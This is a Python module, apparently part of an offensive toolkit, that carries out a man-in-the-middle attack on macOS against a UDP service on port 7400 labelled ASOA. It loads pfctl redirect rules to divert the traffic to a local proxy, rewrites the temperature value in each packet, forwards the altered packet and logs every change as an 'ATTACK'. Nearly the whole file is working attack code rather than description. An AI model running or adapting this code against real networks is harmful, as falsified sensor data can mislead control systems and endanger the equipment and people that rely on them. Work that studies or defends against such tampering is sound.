#!/usr/bin/env python3
"""
macOS MITM Implementation
Uses PF (Packet Filter) redirect to intercept and modify UDP packets
"""

import socket
import struct
import threading
import time
import subprocess
import tempfile
import os
from utils.logger import setup_logger
from packet_handler import PacketHandler

class MacOSMITM:
    def __init__(self, target_ip, attack_type, target_temp=None, bias=None):
        self.target_ip = target_ip
        self.attack_type = attack_type
        self.target_temp = target_temp
        self.bias = bias
        self.logger = setup_logger('macos_mitm', level='INFO')
        
        self.proxy_port = 7401  # Local proxy port
        self.target_port = 7400  # ASOA UDP port
        self.running = False
        self.proxy_thread = None
        self.packet_handler = PacketHandler(attack_type, target_temp, bias)
        
        # PF configuration
        self.pf_rules_file = None
        self.original_pf_rules = None
        
    def start(self):
        """Start the macOS MITM attack"""
        self.logger.info("🍎 Starting macOS MITM attack...")
        
        try:
            # Setup PF redirect rules
            self._setup_pf_rules()
            
            # Start UDP proxy
            self._start_proxy()
            
            self.running = True
            self.logger.info("✅ macOS MITM attack started successfully")
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start macOS MITM: {e}")
            self.stop()
            raise
            
    def stop(self):
        """Stop the macOS MITM attack"""
        self.logger.info("🛑 Stopping macOS MITM attack...")
        
        self.running = False
        
        # Stop proxy thread
        if self.proxy_thread and self.proxy_thread.is_alive():
            self.proxy_thread.join(timeout=5)
            
        # Restore PF rules
        self._restore_pf_rules()
        
        self.logger.info("✅ macOS MITM attack stopped")
        
    def _setup_pf_rules(self):
        """Setup PF rules to redirect UDP traffic"""
        self.logger.info("🔧 Setting up PF redirect rules...")
        
        try:
            # Backup current PF rules
            self._backup_pf_rules()
            
            # Create new PF rules
            pf_rules = f"""
# ASOA MITM Attack PF Rules
# Redirect UDP port 7400 traffic to local proxy

# Redirect incoming UDP packets to proxy
rdr pass inet proto udp from any to {self.target_ip} port {self.target_port} -> 127.0.0.1 port {self.proxy_port}

# Allow proxy to forward packets
pass out inet proto udp from 127.0.0.1 to any port {self.target_port}
"""
            
            # Write rules to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.pf', delete=False) as f:
                f.write(pf_rules)
                self.pf_rules_file = f.name
                
            # Load PF rules
            result = subprocess.run(
                ["pfctl", "-f", self.pf_rules_file],
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                raise Exception(f"Failed to load PF rules: {result.stderr}")
                
            # Enable PF if not already enabled
            result = subprocess.run(
                ["pfctl", "-e"],
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0 and "already enabled" not in result.stderr:
                raise Exception(f"Failed to enable PF: {result.stderr}")
                
            self.logger.info("✅ PF redirect rules loaded successfully")
            
        except Exception as e:
            self.logger.error(f"❌ Failed to setup PF rules: {e}")
            self._restore_pf_rules()
            raise
            
    def _backup_pf_rules(self):
        """Backup current PF rules"""
        try:
            result = subprocess.run(
                ["pfctl", "-s", "rules"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                self.original_pf_rules = result.stdout
                self.logger.debug("✅ PF rules backed up")
            else:
                self.logger.warning("⚠️ Could not backup PF rules")
                
        except Exception as e:
            self.logger.warning(f"⚠️ Failed to backup PF rules: {e}")
            
    def _restore_pf_rules(self):
        """Restore original PF rules"""
        try:
            if self.pf_rules_file and os.path.exists(self.pf_rules_file):
                # Remove our rules
                subprocess.run(
                    ["pfctl", "-f", "/etc/pf.conf"],
                    capture_output=True
                )
                
                # Clean up temporary file
                os.unlink(self.pf_rules_file)
                self.pf_rules_file = None
                
            if self.original_pf_rules:
                # Restore original rules
                with tempfile.NamedTemporaryFile(mode='w', suffix='.pf', delete=False) as f:
                    f.write(self.original_pf_rules)
                    temp_file = f.name
                    
                subprocess.run(
                    ["pfctl", "-f", temp_file],
                    capture_output=True
                )
                
                os.unlink(temp_file)
                self.original_pf_rules = None
                
            self.logger.info("✅ PF rules restored")
            
        except Exception as e:
            self.logger.error(f"❌ Failed to restore PF rules: {e}")
            
    def _start_proxy(self):
        """Start the UDP proxy server"""
        self.logger.info(f"🔄 Starting UDP proxy on port {self.proxy_port}...")
        
        self.proxy_thread = threading.Thread(target=self._proxy_worker)
        self.proxy_thread.daemon = True
        self.proxy_thread.start()
        
    def _proxy_worker(self):
        """UDP proxy worker thread"""
        try:
            # Create proxy socket
            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            proxy_sock.bind(('127.0.0.1', self.proxy_port))
            
            self.logger.info(f"🔄 UDP proxy listening on 127.0.0.1:{self.proxy_port}")
            
            # Create forward socket
            forward_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.running:
                try:
                    # Receive packet from PF redirect
                    data, addr = proxy_sock.recvfrom(4096)
                    
                    if not data:
                        continue
                        
                    # Parse and modify packet
                    modified_data = self._process_packet(data, addr)
                    
                    if modified_data:
                        # Forward modified packet to original destination
                        forward_sock.sendto(modified_data, (self.target_ip, self.target_port))
                        
                        # Log the attack
                        self._log_attack(data, modified_data)
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    self.logger.error(f"❌ Proxy error: {e}")
                    continue
                    
        except Exception as e:
            self.logger.error(f"❌ Failed to start proxy: {e}")
        finally:
            try:
                proxy_sock.close()
                forward_sock.close()
            except:
                pass
                
    def _process_packet(self, data, addr):
        """Process and modify incoming packet"""
        try:
            # Check if this is a UDP packet with temperature data
            if len(data) >= 4:
                # Extract original temperature
                original_temp = struct.unpack('<f', data[:4])[0]
                
                # Modify temperature using packet handler
                modified_temp = self.packet_handler.modify_temperature(original_temp)
                
                # Create modified packet
                modified_data = struct.pack('<f', modified_temp) + data[4:]
                
                self.logger.debug(f"🌡️ Modified temperature: {original_temp:.1f}°C → {modified_temp:.1f}°C")
                
                return modified_data
            else:
                # Forward unmodified packet if too short
                return data
                
        except Exception as e:
            self.logger.error(f"❌ Packet processing error: {e}")
            return data  # Forward original packet on error
            
    def _log_attack(self, original_data, modified_data):
        """Log the attack details"""
        try:
            if len(original_data) >= 4 and len(modified_data) >= 4:
                original_temp = struct.unpack('<f', original_data[:4])[0]
                modified_temp = struct.unpack('<f', modified_data[:4])[0]
                
                self.logger.info(f"🎯 ATTACK: {original_temp:.1f}°C → {modified_temp:.1f}°C")
                
        except Exception as e:
            self.logger.debug(f"Logging error: {e}")
            
    def get_stats(self):
        """Get attack statistics"""
        return {
            'platform': 'macos',
            'target_ip': self.target_ip,
            'target_port': self.target_port,
            'proxy_port': self.proxy_port,
            'attack_type': self.attack_type,
            'running': self.running,
            'packets_processed': getattr(self.packet_handler, 'packets_processed', 0)
        }
